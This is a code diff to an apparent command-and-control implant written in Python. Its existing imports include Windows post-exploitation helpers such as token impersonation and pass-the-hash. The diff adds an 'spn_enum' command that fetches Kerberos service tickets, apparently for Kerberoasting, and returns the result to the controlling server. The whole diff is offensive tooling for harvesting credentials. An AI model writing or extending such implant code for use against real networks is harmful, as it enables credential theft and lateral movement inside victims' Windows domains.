@@ -37,6 +37,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.ipinfo import get_ip_info
     from utils.winapi.make_token import make_token, revert_to_self
     from utils.winapi.pth import pth
+    from utils.winapi.spn_enum import get_kerberos_tickets
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -224,6 +225,16 @@ def execute_commands():
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower() == 'spn_enum':
+                try:
+                    result = get_kerberos_tickets()
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = f"{str(e)}"
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('make_token'):
